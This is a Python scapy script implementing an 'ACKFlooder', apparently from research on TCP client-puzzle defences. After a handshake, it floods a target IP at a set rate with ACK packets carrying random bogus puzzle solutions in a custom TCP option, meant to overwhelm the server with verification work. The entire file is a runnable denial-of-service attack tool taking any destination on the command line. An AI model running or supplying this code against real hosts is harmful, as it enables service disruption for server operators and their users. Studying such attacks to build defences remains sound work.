from scapy.all import *
import time
import numpy as np
import socket
import argparse


class ACKFlooder:
    """

    This flooder agent construct ACK packets with bogus solutions
    in order to overwhelm the server with the burden of verifying
    its bad solutions.

    """

    def __init__(self):
        self.k = 0
        self.m = 0
        self.num_sent_packets = 0
        self.sending_rate = 0
        self.destination = None
        self.dport = 80
        self.interval = 10
        self.mss = 1000
        self.w_scale = 7
        self.tsecr = 0
        self.curr_time = 0
        self.max_packets = np.iinfo(np.int32).max
        self.parser = self.prepareArguments()

    def prepareArguments(self):
        parser = argparse.ArgumentParser(description="Send ack packets with bogus solutions in them.")
        parser.add_argument('--rate', '-r', type=int, required=True,
                            help="The rate at which to send the packets.")
        parser.add_argument('--max_packets', '-c', type=int, default=-1,
                            help="The maximum number of packets to send.")
        parser.add_argument('--num_solutions', '-k', type=int, required=True,
                            help="The number of solutions to prepare.")
        parser.add_argument('--dst', '-d', type=str, required=True,
                            help="The IP address of the destination to flood.")
        return parser

    def sendPacket(self, ip, sequence_number, ack_number):
        # build up the packet's options
        tsval = time.time()
        options = [('Timestamp', (tsval, self.tsecr))]

        # build the solution
        mss_flipped = socket.htons(self.mss)
        opt_str = hex(mss_flipped)[2:].decode('hex')
        opt_str += chr(self.w_scale)

        for i in np.arange(0, self.k):
            # get four random bytes
            rbyte = np.random.randint(low=0, high=np.iinfo(np.int32).max)
            encoded = format(rbyte, 'x')
            length = len(encoded)
            encoded = encoded.zfill(length + length%2)
            encoded = encoded.decode('hex')
            opt_str += encoded

        opt_entry = (253, opt_str)
        options.append(opt_entry)
        ack = TCP(dport=self.dport, flags="A",
                  seq=sequence_number + 1, ack=ack_number, options=options)
        send(ip/ack, verbose=False)

    def startSending(self, maxPackets=-1):
        """
        Send a number of ACKS up to maxPackets

        @maxPackets: the maximum number of packets to send
        """

        start_time = 0
        sport = 0
        seq = np.random.randint(low=0, high=np.iinfo(np.int32).max)

        if (maxPackets == -1):
            maxPackets = self.max_packets

        while self.num_sent_packets < maxPackets:
            ip = IP(dst=self.destination)

            # refresh the sequence number and the timestamps every interval
            # seconds, this is to avoid any timeouts
            if start_time == 0 or (self.curr_time - start_time >= self.interval):
                sport = np.random.randint(low=0, high=65536)
                ts = time.time()
                syn = TCP(dport=self.dport, flags="S", seq=seq,
                          options=[('Timestamp', (ts, 0))])
                synack = sr1(ip/syn)
                ack_num = synack.seq + 1

                opts = synack[IP][TCP].options
                i = 0
                for option in opts:
                  opcode = option[0]
                  val = option[1]
                  if opcode == 'Timestamp':
                      self.tsecr = val[0]

                start_time = time.time()
                print "[Log:] Sent %d packets so far..." % self.num_sent_packets

            self.sendPacket(ip, seq, ack_num)
            self.num_sent_packets += 1
            self.curr_time = time.time()

            if self.sending_rate != 0:
                time.sleep(1.0 / self.sending_rate)

    def start(self):
        args = self.parser.parse_args()
        self.sending_rate = args.rate
        self.k = args.num_solutions
        self.destination = args.dst

        self.startSending(args.max_packets)


if __name__ == '__main__':
    flooder = ACKFlooder()
    flooder.start()
